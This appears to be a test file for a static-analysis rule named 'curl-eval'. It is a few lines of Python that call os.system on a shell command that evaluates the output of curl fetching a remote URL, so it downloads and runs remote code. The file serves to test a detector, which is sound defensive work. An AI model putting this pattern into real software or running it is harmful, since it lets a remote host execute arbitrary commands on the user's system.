from os import system

# ruleid: curl-eval
if system('eval `curl -s "http://www.very-secure-website.net"`'):
    print("Command failed!")
else:
    print("Success")
